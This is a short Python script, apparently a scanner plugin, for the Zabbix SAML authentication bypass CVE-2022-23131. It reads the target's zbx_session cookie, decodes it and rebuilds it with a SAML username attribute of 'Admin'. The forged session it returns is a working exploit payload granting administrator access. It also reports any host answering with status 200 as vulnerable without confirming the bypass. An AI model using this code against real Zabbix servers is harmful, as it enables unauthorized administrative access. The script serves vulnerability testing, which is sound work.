import requests
import re, base64, urllib.parse, json

def verify(url):
    relsult = {
        'name': 'Zabbix SAML 未授权访问(CVE-2022-23131)',
        'vulnerable': False,
        'attack': False,
        'url': url,
        'about': 'https://github.com/Mr-xn/cve-2022-23131, https://www.secpulse.com/archives/179601.html'

    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    timeout = 3
    try:
        rep = requests.get(url, timeout=timeout, headers=headers, verify=False)
        if rep.status_code == 200:
            session = re.findall("zbx_session=(.*?);", rep.headers.get("Set-Cookie"))[0]
            base64_decode = base64.b64decode(urllib.parse.unquote(session, encoding="utf-8"))
            session_json = json.loads(base64_decode)
            payload = '{"saml_data":{"username_attribute":"Admin"},"sessionid":"%s","sign":"%s"}' % (session_json["sessionid"], session_json["sign"])
            payload_encode = urllib.parse.quote(base64.b64encode(payload.encode()))
            relsult['vulnerable'] = True
            relsult['zbx_signed_session'] = payload_encode
        return relsult
    except:
        return relsult

